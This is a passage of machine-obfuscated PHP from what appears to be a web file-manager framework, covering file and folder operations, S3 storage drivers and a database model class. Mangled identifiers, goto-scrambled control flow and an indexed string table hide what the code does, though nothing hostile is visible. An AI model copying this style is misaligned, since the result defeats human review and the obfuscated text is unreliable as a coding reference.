0, 2) == $C‘³‡°•¡[1147]) { $c¸ğå·œÙ° = BASIC_PATH . substr($c¸ğå·œÙ°, 2); } $a„ïáùºĞˆ = KodIO::clear($a„ïáùºĞˆ); goto FÛÆ¿®¾Áè; A‘¡¤˜øğ: $C‘³‡°•¡ =& $_SERVER[Äº¡•ô™Ÿ]; $a„ïáùºĞˆ = $this->iconvApp($this->pathBase); $c¸ğå·œÙ° = $this->iconvApp($c¸ğå·œÙ°); goto eäõßÉª ‹; C‡‚Şß·˜: } public function mkfile($bŒ™½äˆğ, $F¨Å¬¿èÒ§ = '', $eÈõöˆç‰Ñ = REPEAT_RENAME) { $bŒ™½äˆğ = $this->iconvSystem($bŒ™½äˆğ); @touch($bŒ™½äˆğ); if ($F¨Å¬¿èÒ§) { file_put_contents($bŒ™½äˆğ, $F¨Å¬¿èÒ§); } return is_file($bŒ™½äˆğ) ? $this->getPathOuter($bŒ™½äˆğ) : !1; } public function mkdir($c®ÅÈÏ…à, $Fª¸¢Ş²â = REPEAT_SKIP) { $c®ÅÈÏ…à = $this->iconvSystem($c®ÅÈÏ…à); if (is_dir($c®ÅÈÏ…à)) { return $this->getPathOuter($c®ÅÈÏ…à); } @mkdir($c®ÅÈÏ…à, 511, !0); return is_dir($c®ÅÈÏ…à) ? $this->getPathOuter($c®ÅÈÏ…à) : !1; } public function copyFile($f¿¸ÏøóôÆ, $AòÅ„Šˆ) { $this->mkdir($this->pathFather($AòÅ„Šˆ)); $f¿¸ÏøóôÆ = $this->iconvSystem($f¿¸ÏøóôÆ); $AòÅ„Šˆ = $this->iconvSystem($AòÅ„Šˆ); $B«æ†ÛŒ›Â = @copy($f¿¸ÏøóôÆ, $AòÅ„Šˆ); return $B«æ†ÛŒ›Â ? $this->getPathOuter($AòÅ„Šˆ) : !1; } public function moveFile($DÎ¬”Ïß‚”, $cá´§‘ë»Ë) { $this->mkdir($this->pathFather($cá´§‘ë»Ë)); $DÎ¬”Ïß‚” = $this->iconvSystem($DÎ¬”Ïß‚”); $cá´§‘ë»Ë = $this->iconvSystem($cá´§‘ë»Ë); $AØÌ›äö” = intval(@rename($DÎ¬”Ïß‚”, $cá´§‘ë»Ë)); if (!$AØÌ›äö”) { if ($AØÌ›äö” = intval(@copy($DÎ¬”Ïß‚”, $cá´§‘ë»Ë))) { @unlink($DÎ¬”Ïß‚”); } } return $AØÌ›äö” ? $this->getPathOuter($cá´§‘ë»Ë) : !1; } public function delFile($bí¦Ì›ğ¦À) { $bí¦Ì›ğ¦À = $this->iconvSystem($bí¦Ì›ğ¦À); if (!@unlink($bí¦Ì›ğ¦À)) { @chmod($bí¦Ì›ğ¦À, 511); if (!@unlink($bí¦Ì›ğ¦À)) { return !1; } } else { return !0; } } public function delFolder($Dçòô³¸Úñ) { goto d¢¯ª«÷Ï¡; EÉ˜èƒ•´•: if (!($f½ Û¼Ëİš = opendir($Dçòô³¸Úñ))) { return !1; } while (($Eğ„‚—Ñæ¥ = readdir($f½ Û¼Ëİš)) !== !1) { if ($Eğ„‚—Ñæ¥ == $bî‹Ñ¤İ¬‚[93] || $Eğ„‚—Ñæ¥ == $bî‹Ñ¤İ¬‚[1157]) { continue; } $A­ö¾å…«‹ = $Dçòô³¸Úñ . $bî‹Ñ¤İ¬‚[8] . $Eğ„‚—Ñæ¥; if (!is_dir($A­ö¾å…«‹)) { if (!unlink($A­ö¾å…«‹)) { chmod($A­ö¾å…«‹, 511); if (!unlink($A­ö¾å…«‹)) { return !1; } } } else { chmod($A­ö¾å…«‹, 511); $A­ö¾å…«‹ = $this->iconvApp($A­ö¾å…«‹); if (!$this->delFolder($A­ö¾å…«‹)) { return !1; } } } closedir($f½ Û¼Ëİš); goto D•¯×Ğ²Ï†; d¢¯ª«÷Ï¡: $bî‹Ñ¤İ¬‚ =& $_SERVER[Äº¡•ô™Ÿ]; $Dçòô³¸Úñ = $this->iconvSystem($Dçòô³¸Úñ); if (!is_dir($Dçòô³¸Úñ)) { return !0; } goto EÉ˜èƒ•´•; D•¯×Ğ²Ï†: return rmdir($Dçòô³¸Úñ); goto BÈãŸÛğ¾; BÈãŸÛğ¾: } public function rename($e‡­·ÕÒ±–, $aõ óÓ»Šç) { goto eÀà‡íÅï¡; B‚Ë’‘ÅÀŸ: $e‡­·ÕÒ±– = $this->iconvSystem($e‡­·ÕÒ±–); $CÂºš´ÒÀÔ = $this->pathFather($e‡­·ÕÒ±–); $BĞ²¬¸À„‡ = rtrim($CÂºš´ÒÀÔ, $A½ö‹é‚ƒÎ[8]) . $A½ö‹é‚ƒÎ[8] . $A¼îêâ›¾ƒ; goto aêöô¨ß í; eÀà‡íÅï¡: $A½ö‹é‚ƒÎ =& $_SERVER[Äº¡•ô™Ÿ]; $A¼îêâ›¾ƒ = $this->fileNameAuto($this->pathFather($e‡­·ÕÒ±–), $aõ óÓ»Šç); $A¼îêâ›¾ƒ = $this->iconvSystem($A¼îêâ›¾ƒ); goto B‚Ë’‘ÅÀŸ; aêöô¨ß í: $AÌ‹˜ËÄµ¦ = @rename($e‡­·ÕÒ±–, $BĞ²¬¸À„‡); $BĞ²¬¸À„‡ = $this->iconvApp($BĞ²¬¸À„‡); return $AÌ‹˜ËÄµ¦ ? $this->getPathOuter($BĞ²¬¸À„‡) : !1; goto FÄ­ÉèÌÅ”; FÄ­ÉèÌÅ”: } public function size($C¢–¨º“¹) { $C¢–¨º“¹ = $this->iconvSystem($C¢–¨º“¹); return (double) abs(sprintf($_SERVER[Äº¡•ô™Ÿ][1159], @filesize($C¢–¨º“¹))); } public function info($eÀ…çáÎª ) { $eÀ…çáÎª  = $this->iconvSystem($eÀ…çáÎª ); if ($this->isFolder($eÀ…çáÎª )) { return $this->folderInfo($eÀ…çáÎª ); } else { if ($this->isFile($eÀ…çáÎª )) { return $this->fileInfo($eÀ…çáÎª ); } } return !1; } protected function infoChildren($EÒåÎÓ‰Õä, &$a”« ªÒ, $EÌ©’¼ª = true) { $FÄª‘Á¿Ë =& $_SERVER[Äº¡•ô™Ÿ]; $EÒåÎÓ‰Õä = rtrim($EÒåÎÓ‰Õä, $FÄª‘Á¿Ë[8]) . $FÄª‘Á¿Ë[8]; if ($EÌ©’¼ª) { check_abort(); $EÒåÎÓ‰Õä = $this->iconvSystem($EÒåÎÓ‰Õä); } if (!($dîğóì¬Ø£ = @opendir($EÒåÎÓ‰Õä))) { return; } while (($b†òÜç‚°ğ = readdir($dîğóì¬Ø£)) !== !1) { if ($b†òÜç‚°ğ == $FÄª‘Á¿Ë[93] || $b†òÜç‚°ğ == $FÄª‘Á¿Ë[1157]) { continue; } $A‘î¬¸Ú = $EÒåÎÓ‰Õä . $b†òÜç‚°ğ; if (is_file($A‘î¬¸Ú)) { $a”« ªÒ[$FÄª‘Á¿Ë[78]]++; $a”« ªÒ[$FÄª‘Á¿Ë[77]] += (double) abs(sprintf($FÄª‘Á¿Ë[1159], @filesize($A‘î¬¸Ú))); } else { $a”« ªÒ[$FÄª‘Á¿Ë[79]]++; $this->infoChildren($A‘î¬¸Ú, $a”« ªÒ, !1); } } closedir($dîğóì¬Ø£); } private function folderInfo($b¨¼ÑË«´, $eÆĞŒÕ“øÖ = false) { $FŸ´‰ÜÄñ– =& $_SERVER[Äº¡•ô™Ÿ]; $b¨¼ÑË«´ = rtrim($b¨¼ÑË«´, $FŸ´‰ÜÄñ–[8]) . $FŸ´‰ÜÄñ–[8]; $a¦äğÜ±ƒ¯ = $this->iconvApp($this->pathThis($b¨¼ÑË«´)); if ($eÆĞŒÕ“øÖ) { return array($FŸ´‰ÜÄñ–[28] => $a¦äğÜ±ƒ¯, $FŸ´‰ÜÄñ–[75] => $this->getPathOuter($b¨¼ÑË«´), $FŸ´‰ÜÄñ–[29] => $FŸ´‰ÜÄñ–[76]); } $CÔãÚŞÛ = array($FŸ´‰ÜÄñ–[28] => $a¦äğÜ±ƒ¯, $FŸ´‰ÜÄñ–[75] => $this->getPathOuter($b¨¼ÑË«´), $FŸ´‰ÜÄñ–[29] => $FŸ´‰ÜÄñ–[76], $FŸ´‰ÜÄñ–[184] => @filectime($b¨¼ÑË«´), $FŸ´‰ÜÄñ–[107] => @filemtime($b¨¼ÑË«´), $FŸ´‰ÜÄñ–[1160] => @fileatime($b¨¼ÑË«´), $FŸ´‰ÜÄñ–[1154] => is_readable($b¨¼ÑË«´), $FŸ´‰ÜÄñ–[1155] => is_writable($b¨¼ÑË«´), $FŸ´‰ÜÄñ–[1161] => get_mode($b¨¼ÑË«´)); return $CÔãÚŞÛ; } private function fileInfo($AÑÑÆì¨ãê, $FĞïè•‹µÌ = false) { $AÎ¿Åºğ¿ =& $_SERVER[Äº¡•ô™Ÿ]; $c§İà¥º = $this->iconvApp($this->pathThis($AÑÑÆì¨ãê)); if ($FĞïè•‹µÌ) { return array($AÎ¿Åºğ¿[28] => $c§İà¥º, $AÎ¿Åºğ¿[75] => $this->getPathOuter($AÑÑÆì¨ãê), $AÎ¿Åºğ¿[29] => $AÎ¿Åºğ¿[164], $AÎ¿Åºğ¿[77] => $this->size($AÑÑÆì¨ãê), $AÎ¿Åºğ¿[157] => $this->ext($c§İà¥º)); } $CªÀ•«î¥ = array($AÎ¿Åºğ¿[28] => $c§İà¥º, $AÎ¿Åºğ¿[75] => $this->getPathOuter($AÑÑÆì¨ãê), $AÎ¿Åºğ¿[29] => $AÎ¿Åºğ¿[164], $AÎ¿Åºğ¿[184] => @filectime($AÑÑÆì¨ãê), $AÎ¿Åºğ¿[107] => @filemtime($AÑÑÆì¨ãê), $AÎ¿Åºğ¿[1160] => @fileatime($AÑÑÆì¨ãê), $AÎ¿Åºğ¿[77] => $this->size($AÑÑÆì¨ãê), $AÎ¿Åºğ¿[157] => $this->ext($c§İà¥º), $AÎ¿Åºğ¿[1154] => is_readable($AÑÑÆì¨ãê), $AÎ¿Åºğ¿[1155] => is_writable($AÑÑÆì¨ãê), $AÎ¿Åºğ¿[1161] => get_mode($AÑÑÆì¨ãê)); return $CªÀ•«î¥; } public function exist($cê×Éä†­) { $cê×Éä†­ = $this->iconvSystem($cê×Éä†­); return @file_exists($cê×Éä†­); } public function isFile($cĞºùóÀ¡ô) { $cĞºùóÀ¡ô = $this->iconvSystem($cĞºùóÀ¡ô); return @is_file($cĞºùóÀ¡ô); } public function isFolder($b©Çˆ§Ï©Ê) { $b©Çˆ§Ï©Ê = $this->iconvSystem($b©Çˆ§Ï©Ê); return @is_dir($b©Çˆ§Ï©Ê); } public function listPath($E­©íÃ´Áê, $AáŸŠ©åÚ = false) { goto d‡Ã ÈŒÃ; d‡Ã ÈŒÃ: $Dµµ‹Â“Ÿ— =& $_SERVER[Äº¡•ô™Ÿ]; $E­©íÃ´Áê = $this->iconvSystem($E­©íÃ´Áê); $E­©íÃ´Áê = rtrim($E­©íÃ´Áê, $Dµµ‹Â“Ÿ—[8]) . $Dµµ‹Â“Ÿ—[8]; goto cˆĞÅ’‹í£; e‡®çõ×‰ª: closedir($F¤Û‘íÅÑè); return $bÄ½åé¹’Ï; goto A‘ÌÍˆæìˆ; cˆĞÅ’‹í£: $bÄ½åé¹’Ï = array($Dµµ‹Â“Ÿ—[74] => array(), $Dµµ‹Â“Ÿ—[73] => array()); if (!($F¤Û‘íÅÑè = @opendir($E­©íÃ´Áê))) { return $bÄ½åé¹’Ï; } while (($bƒ—ÉÜÂ£¸ = readdir($F¤Û‘íÅÑè)) !== !1) { if ($bƒ—ÉÜÂ£¸ == $Dµµ‹Â“Ÿ—[93] || $bƒ—ÉÜÂ£¸ == $Dµµ‹Â“Ÿ—[1157]) { continue; } $cêÈËß‚ˆ = $E­©íÃ´Áê . $bƒ—ÉÜÂ£¸; if (is_file($cêÈËß‚ˆ)) { $bÄ½åé¹’Ï[$Dµµ‹Â“Ÿ—[73]][] = $this->fileInfo($cêÈËß‚ˆ, $AáŸŠ©åÚ); } else { $bÄ½åé¹’Ï[$Dµµ‹Â“Ÿ—[74]][] = $this->folderInfo($cêÈËß‚ˆ, $AáŸŠ©åÚ); } } goto e‡®çõ×‰ª; A‘ÌÍˆæìˆ: } public function listAll($EÒ©®¬‘•×, &$E§¬ôÆãñ = array()) { goto FõÍ¾òŸá; BêÙÍÊÚ¯–: if (!($f±à¥Ì«ï£ = @opendir($EÒ©®¬‘•×))) { return $E§¬ôÆãñ; } while (($DÌêô™³öŞ = readdir($f±à¥Ì«ï£)) !== !1) { if ($DÌêô™³öŞ == $AŒÉ¼ëİ—÷[93] || $DÌêô™³öŞ == $AŒÉ¼ëİ—÷[1157]) { continue; } $C‡—·ñìí» = $EÒ©®¬‘•× . $DÌêô™³öŞ; if (is_dir($C‡—·ñìí»)) { $E§¬ôÆãñ[] = array($AŒÉ¼ëİ—÷[75] => $C‡—·ñìí» . $AŒÉ¼ëİ—÷[8], $AŒÉ¼ëİ—÷[76] => 1, $AŒÉ¼ëİ—÷[77] => 0); $this->listAll($C‡—·ñìí», $E§¬ôÆãñ); } else { $E§¬ôÆãñ[] = array($AŒÉ¼ëİ—÷[75] => $C‡—·ñìí», $AŒÉ¼ëİ—÷[76] => 0, $AŒÉ¼ëİ—÷[77] => $this->size($C‡—·ñìí»)); } } closedir($f±à¥Ì«ï£); goto d›ˆ¿¯áó; d›ˆ¿¯áó: return $E§¬ôÆãñ; goto e½”Û¿åòÜ; FõÍ¾òŸá: $AŒÉ¼ëİ—÷ =& $_SERVER[Äº¡•ô™Ÿ]; $EÒ©®¬‘•× = $this->iconvSystem($EÒ©®¬‘•×); $EÒ©®¬‘•× = rtrim($EÒ©®¬‘•×, $AŒÉ¼ëİ—÷[8]) . $AŒÉ¼ëİ—÷[8]; goto BêÙÍÊÚ¯–; e½”Û¿åòÜ: } public function has($AœŒñ¥æÔ, $Bé²å³Èß¢ = false, $AìÏ‹¥Æ¶Ÿ = true) { goto b™ßÆ‹«ä ; EŠÄ»ô¿‡Ò: return !1; goto c±¦œ¨–ÉÉ; DöªÑÓ–®‰: while (($b§ğ¦Şññ÷ = readdir($EµöÕßÈí)) !== !1) { if ($b§ğ¦Şññ÷ == $d¥ğËçˆªŸ[93] || $b§ğ¦Şññ÷ == $d¥ğËçˆªŸ[1157]) { continue; } $CÊËø«‚Ÿá = $AœŒñ¥æÔ . $b§ğ¦Şññ÷; if ($Bé²å³Èß¢) { if (@is_file($CÊËø«‚Ÿá)) { $DÊ…ùÆˆ±í++; } else { $Eá‰Î×¹‰++; } continue; } if ($AìÏ‹¥Æ¶Ÿ) { if (@is_file($CÊËø«‚Ÿá)) { return !0; } } else { if (@is_dir($CÊËø«‚Ÿá . $d¥ğËçˆªŸ[8])) { return !0; } } } closedir($EµöÕßÈí); if ($Bé²å³Èß¢) { return array($d¥ğËçˆªŸ[188] => $DÊ…ùÆˆ±í, $d¥ğËçˆªŸ[189] => $Eá‰Î×¹‰); } goto EŠÄ»ô¿‡Ò; a‚¨·ŠÅ£ß: if (!($EµöÕßÈí = @opendir($AœŒñ¥æÔ))) { return !1; } $DÊ…ùÆˆ±í = 0; $Eá‰Î×¹‰ = 0; goto DöªÑÓ–®‰; b™ßÆ‹«ä : $d¥ğËçˆªŸ =& $_SERVER[Äº¡•ô™Ÿ]; $AœŒñ¥æÔ = $this->iconvSystem($AœŒñ¥æÔ); $AœŒñ¥æÔ = rtrim($AœŒñ¥æÔ, $d¥ğËçˆªŸ[8]) . $d¥ğËçˆªŸ[8]; goto a‚¨·ŠÅ£ß; c±¦œ¨–ÉÉ: } public function hashSimple($b‚¤ù»¨¢) { goto F»åÈëËŞï; eÓ×Ï›ÙíÙ: $ağµ¦é•½£ = $this->size($b‚¤ù»¨¢); $fŒ”’¤íî÷ = 200; $a†£–˜…„õ = 50; goto A¼ˆáµ¤Æö; b¯ïÈ›«Â: fseek($dô‰‡’½š’, $ağµ¦é•½£ - $fŒ”’¤íî÷); $D²ÊŞ‚æ“ .= fread($dô‰‡’½š’, $fŒ”’¤íî÷); fclose($dô‰‡’½š’); goto d—ï¹èØôë; BÌóá¨·‘: $dô‰‡’½š’ = fopen($b‚¤ù»¨¢, $E˜Õ˜¿öĞ­[1162]); if (!$dô‰‡’½š’) { return $D²ÊŞ‚æ“; } for ($B‚Ñ–÷‚ÛÊ = 0; $B‚Ñ–÷‚ÛÊ < $a†£–˜…„õ; $B‚Ñ–÷‚ÛÊ++) { fseek($dô‰‡’½š’, $A‡¼‘ã“Ü¥ * $B‚Ñ–÷‚ÛÊ); $D²ÊŞ‚æ“ .= fread($dô‰‡’½š’, $fŒ”’¤íî÷); } goto b¯ïÈ›«Â; A¼ˆáµ¤Æö: if ($ağµ¦é•½£ <= $fŒ”’¤íî÷ * $a†£–˜…„õ) { return $this->hashMd5($b‚¤ù»¨¢) . $ağµ¦é•½£; } $D²ÊŞ‚æ“ = $E˜Õ˜¿öĞ­[33]; $A‡¼‘ã“Ü¥ = intval($ağµ¦é•½£ / $a†£–˜…„õ); goto BÌóá¨·‘; F»åÈëËŞï: $E˜Õ˜¿öĞ­ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$b‚¤ù»¨¢) { return md5($E˜Õ˜¿öĞ­[33]); } $b‚¤ù»¨¢ = $this->iconvSystem($b‚¤ù»¨¢); goto eÓ×Ï›ÙíÙ; d—ï¹èØôë: return md5($D²ÊŞ‚æ“) . $ağµ¦é•½£; goto BâÇ‹‚é; BâÇ‹‚é: } public function getContent($a™–††­¤’) { $a™–††­¤’ = $this->iconvSystem($a™–††­¤’); return file_get_contents($a™–††­¤’); } public function setContent($B±Â–£“Ó¿, $CÀã³ = '') { $B±Â–£“Ó¿ = $this->iconvSystem($B±Â–£“Ó¿); @file_put_contents($B±Â–£“Ó¿, $CÀã³, LOCK_EX); clearstatcache(); return strlen($CÀã³) == filesize($B±Â–£“Ó¿); } public function fileSubstr($CÅºÔã‹¿, $f¶Š§…±«â = 0, $fİÂéƒ„Ø = false) { goto c¢³Ö…•Ó; AÛİ£ªÃ¢Ï: fseek($f‚Œ„Ñ ‘—, $f¶Š§…±«â); $CëŞöğÎ§ = fread($f‚Œ„Ñ ‘—, $fİÂéƒ„Ø); fclose($f‚Œ„Ñ ‘—); goto bÍ¼¸Ù™Ö’; bÍ¼¸Ù™Ö’: return $CëŞöğÎ§; goto C„¤‡—Œ×; eİƒÔ§Œî¬: if ($fİÂéƒ„Ø <= 0) { return $CÇ´êÏ¹×“[33]; } $f‚Œ„Ñ ‘— = fopen($CÅºÔã‹¿, $CÇ´êÏ¹×“[1162]); if (!$f‚Œ„Ñ ‘—) { return !1; } goto AÛİ£ªÃ¢Ï; c¢³Ö…•Ó: $CÇ´êÏ¹×“ =& $_SERVER[Äº¡•ô™Ÿ]; $CÅºÔã‹¿ = $this->iconvSystem($CÅºÔã‹¿); if ($fİÂéƒ„Ø === !1) { $fİÂéƒ„Ø = $this->size($CÅºÔã‹¿); } goto eİƒÔ§Œî¬; C„¤‡—Œ×: } public function upload($d¶â™‹’½, $d¨èÇØ­ŠÖ, $fßƒ»Â¥ßí = false, $F¡ó‰î£ = REPEAT_REPLACE) { $f„êòİ¶ÀÂ = $this->copyFile($d¨èÇØ­ŠÖ, $d¶â™‹’½); return $f„êòİ¶ÀÂ ? $this->getPathOuter($d¶â™‹’½) : !1; } public function download($EƒäÍá¨›³, $e‰ÀÀ¥ ¥Ñ) { return $this->iconvSystem($EƒäÍá¨›³); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($f˜•ÇÌ£ëÙ) { parent::__construct($f˜•ÇÌ£ëÙ); $this->signatureVersion($_SERVER[Äº¡•ô™Ÿ][197]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($Bºô¨¬Ì”Ğ) { parent::__construct($Bºô¨¬Ì”Ğ); $this->signatureVersion($_SERVER[Äº¡•ô™Ÿ][197]); } public function fileOutLink($cÊšÀ½õ¯) { $cÕ„†¾Î›à =& $_SERVER[Äº¡•ô™Ÿ]; if (substr($cÊšÀ½õ¯, 0, 7) == $cÕ„†¾Î›à[1108]) { $cÊšÀ½õ¯ = $cÕ„†¾Î›à[1109] . substr($cÊšÀ½õ¯, 7); } header($cÕ„†¾Î›à[153] . $cÊšÀ½õ¯); die; } } goto EãØÈ¸ÈÌò; FÄì´íÆ‘ï: define($_SERVER[Äº¡•ô™Ÿ][227], 0); define($_SERVER[Äº¡•ô™Ÿ][228], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\x65", "\x6f\162\x64\x65\162", "\141\x6c\x69\141\x73", "\150\x61\x76\x69\x6e\x67", "\147\x72\x6f\x75\160", "\x6c\x6f\143\153", "\x64\x69\163\x74\151\156\143\x74", "\141\x75\164\x6f", "\146\151\x6c\x74\145\162", "\166\x61\x6c\x69\144\x61\x74\x65", "\162\x65\163\165\x6c\164", "\x62\151\156\144", "\x74\x6f\153\145\156"); public function __construct($f»‡¨‘Ñ¢ = '', $céïØÁ†ñï = '', $B¬ÛÅ‡¼óÌ = '') { $FäÓÜùª‘“ =& $_SERVER[Äº¡•ô™Ÿ]; $this->_initialize(); if (!empty($f»‡¨‘Ñ¢)) { if (strpos($f»‡¨‘Ñ¢, $FäÓÜùª‘“[93])) { list($this->dbName, $this->name) = explode($FäÓÜùª‘“[93], $f»‡¨‘Ñ¢); } else { $this->name = $f»‡¨‘Ñ¢; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($céïØÁ†ñï)) { $this->tablePrefix = $FäÓÜùª‘“[33]; } elseif ($FäÓÜùª‘“[33] != $céïØÁ†ñï) { $this->tablePrefix = $céïØÁ†ñï; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($FäÓÜùª‘“[229]); } $this->db(0, empty($this->connection) ? $B¬ÛÅ‡¼óÌ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $bèØ³é’­Ÿ =& $_SERVER[Äº¡•ô™Ÿ]; if (empty($this->fields)) { if (think_config($bèØ³é’­Ÿ[230])) { $Dß°­¸÷± = $this->dbName ? $this->dbName : think_config($bèØ³é’­Ÿ[231]); $dŸßï…èìš = think_var_cache($bèØ³é’­Ÿ[232] . strtolower(get_path_this($Dß°­¸÷±) . $bèØ³é’­Ÿ[93] . $this->name)); if ($dŸßï…èìš) { $cãİÕğøæö = think_config($bèØ³é’­Ÿ[233]); if (empty($cãİÕğøæö) || $dŸßï…èìš[$bèØ³é’­Ÿ[234]] == $cãİÕğøæö) { $this->fields = $dŸßï…èìš; return; } } } $this->flush(); } } public function flush() { goto D¢ÅØ‡”ã­; a´°¸ùòàÉ: if (!$f—õÔĞÖ¨ò) { return !1; } $this->fields = array_keys($f—õÔĞÖ¨ò); $this->fields[$Eœ’®±Šƒ[235]] = !1; goto A±¿¢‘ÛÂ; eØÕ´ç‘´…: if (think_config($Eœ’®±Šƒ[230])) { $f‰†±È‚±· = $this->dbName ? $this->dbName : think_config($Eœ’®±Šƒ[231]); think_var_cache($Eœ’®±Šƒ[232] . strtolower(get_path_this($f‰†±È‚±·) . $Eœ’®±Šƒ[93] . $this->name), $this->fields); } goto f¿µƒÅèæÕ; D¢ÅØ‡”ã­: $Eœ’®±Šƒ =& $_SERVER[Äº¡•ô™Ÿ]; $this->db->setModel($this->name); $f—õÔĞÖ¨ò = $this->db->getFields($this->getTableName()); goto a´°¸ùòàÉ; A±¿¢‘ÛÂ: foreach ($f—õÔĞÖ¨ò as $D¾Û·ö¡¿¦ => $E´á±¼‡Ø­) { $f¼¯œã“ëÜ[$D¾Û·ö¡¿¦] = $E´á±¼‡Ø­[$Eœ’®±Šƒ[29]]; if ($E´á±¼‡Ø­[$Eœ’®±Šƒ[36]]) { $this->fields[$Eœ’®±Šƒ[236]] = $D¾Û·ö¡¿¦; if ($E´á±¼‡Ø­[$Eœ’®±Šƒ[39]]) { $this->fields[$Eœ’®±Šƒ[235]] = !0; } } } $this->fields[$Eœ’®±Šƒ[237]] = $f¼¯œã“ëÜ; if (think_config($Eœ’®±Šƒ[233])) { $this->fields[$Eœ’®±Šƒ[234]] = think_config($Eœ’®±Šƒ[233]); } goto eØÕ´ç‘´…; f¿µƒÅèæÕ: } public function switchModel($bÊÎí³¥ò, $AâÊöçµí… = array()) { $A Ğ–Ñ¼ =& $_SERVER[Äº¡•ô™Ÿ]; $có¸òÛ„ÖÚ = ucwords(strtolower($bÊÎí³¥ò)) . $A Ğ–Ñ¼[238]; if (!class_exists($có¸òÛ„ÖÚ)) { think_exception($có¸òÛ„ÖÚ . think_lang($A Ğ–Ñ¼[239])); } $this->_extModel = new $có¸òÛ„ÖÚ($this->name); if (!empty($AâÊöçµí…)) { foreach ($AâÊöçµí… as $C°¬¥Áò§Ù) { $this->_extModel->setProperty($C°¬¥Áò§Ù, $this->{$C°¬¥Áò§Ù}); } } return $this->_extModel; } public function __set($fßŠÂÏÆ®, $b²¢°Ğ°Àª) { $this->data[$fßŠÂÏÆ®] = $b²¢°Ğ°Àª; } public function __get($b™¤ëŠã) { return isset($this->data[$b™¤ëŠã]) ? $this->data[$b™¤ëŠã] : null; } public function __isset($Dìë¦ÚˆéÃ) { return isset($this->data[$Dìë¦ÚˆéÃ]); } public function __unset($FïÀ¾¯Ş½é) { unset($this->data[$FïÀ¾¯Ş½é]); } public function __call($eÉßÊ‚åùâ, $bÀš½‡¢÷Ø) { $e‚è°½ìòµ =& $_SERVER[Äº¡•ô™Ÿ]; if (in_array(strtolower($eÉßÊ‚åùâ), $this->methods, !0)) { $this->options[strtolower($eÉßÊ‚åùâ)] = $bÀš½‡¢÷Ø[0]; return $this; } elseif (in_array(strtolower($eÉßÊ‚åùâ), array($e‚è°½ìòµ[240], $e‚è°½ìòµ[241], $e‚è°½ìòµ[242], $e‚è°½ìòµ[243], $e‚è°½ìòµ[244]), !0)) { $b¬Áğ¬£¼™ = isset($bÀš½‡¢÷Ø[0]) ? $bÀš½‡¢÷Ø[0] : $e‚è°½ìòµ[173]; $b¬Áğ¬£¼™ = $this->db->parseKey($b¬Áğ¬£¼™); return $this->getField(strtoupper($eÉßÊ‚åùâ) . $e‚è°½ìòµ[245] . $b¬Áğ¬£¼™ . $e‚è°½ìòµ[246] . $eÉßÊ‚åùâ, $e‚è°½ìòµ[240]); } elseif (strtolower(substr($eÉßÊ‚åùâ, 0, 5)) == $e‚è°½ìòµ[247]) { $b¬Áğ¬£¼™ = think_parse_name(substr($eÉßÊ‚åùâ, 5)); $EëŞÜ­§‡[$b¬Áğ¬£¼™] = $bÀš½‡¢÷Ø[0]; return $this->where($EëŞÜ­§‡)->find(); } elseif (strtolower(substr($eÉßÊ‚åùâ, 0, 10)) == $e‚è°½ìòµ[248]) { $DãÕî©° = think_parse_name(substr($eÉßÊ‚åùâ, 10)); $EëŞÜ­§‡[$DãÕî©°] = $bÀš½‡¢÷Ø[0]; return $this->where($EëŞÜ­§‡)->getField($bÀš½‡¢÷Ø[1]); } elseif (isset($this->_scope[$eÉßÊ‚åùâ])) { return $this->scope($eÉßÊ‚åùâ, $bÀš½‡¢÷Ø[0]); } elseif (method_exists($this, $eÉßÊ‚åùâ)) { array_unshift($bÀš½‡¢÷Ø, $eÉßÊ‚åùâ); return call_user_func_array(array($this, $e‚è°½ìòµ[249]), $bÀš½‡¢÷Ø); } else { return call_user_func_array(array(parent, $eÉßÊ‚åùâ), $bÀš½‡¢÷Ø); } } protected function call() { goto E—ç¹Ø•; BÓœ¢Š„¸: $BÎÍ•ë¡ßß = $bê‹ÍÅ¼º; if (is_array($bê‹ÍÅ¼º)) { $BÎÍ•ë¡ßß = $bê‹ÍÅ¼º[1]; $bê‹ÍÅ¼º = $bê‹ÍÅ¼º[0]; } $D¬Ê‡»«Òƒ = count($dÛ‰¬’éïŠ) - 1; goto EÕ¬İÜ«¬; EÕ¬İÜ«¬: if (isset($dÛ‰¬’éïŠ[$D¬Ê‡»«Òƒ]) && $dÛ‰¬’éïŠ[$D¬Ê‡»«Òƒ] === $bê‹ÍÅ¼º) { think_exception(__CLASS__ . $d¾Éñšô¢‹[4] . $bê‹ÍÅ¼º . think_lang($d¾Éñšô¢‹[250])); return; } $dÛ‰¬’éïŠ[] = $bê‹ÍÅ¼º; if (method_exists($this, $d¾Éñšô¢‹[251])) { $D¨«¯¾±Ôí = call_user_func_array(array($this, $d¾Éñšô¢‹[252]), array($BÎÍ•ë¡ßß, $dÛ‰¬’éïŠ)); if (!is_null($D¨«¯¾±Ôí) && $D¨«¯¾±Ôí !== !1) { return $D¨«¯¾±Ôí; } } goto dîë…Ç¦“¾; dîë…Ç¦“¾: $a÷Ê—ÃÅ×ƒ = call_user_func_array(array($this, $bê‹ÍÅ¼º), $dÛ‰¬’éïŠ); if (method_exists($this, $d¾Éñšô¢‹[253])) { $D¨«¯¾±Ôí = call_user_func_array(array($this, $d¾Éñšô¢‹[254]), array($BÎÍ•ë¡ßß, $dÛ‰¬’éïŠ, $a÷Ê—ÃÅ×ƒ)); if ($D¨«¯¾±Ôí) { return $D¨«¯¾±Ôí; } } return $a÷Ê—ÃÅ×ƒ; goto D­ŒÛŞÔãŞ; E—ç¹Ø•: $d¾Éñšô¢‹ =& $_SERVER[Äº¡•ô™Ÿ]; $dÛ‰¬’éïŠ = func_get_args(); $bê‹ÍÅ¼º = array_shift($dÛ‰¬’éïŠ); goto 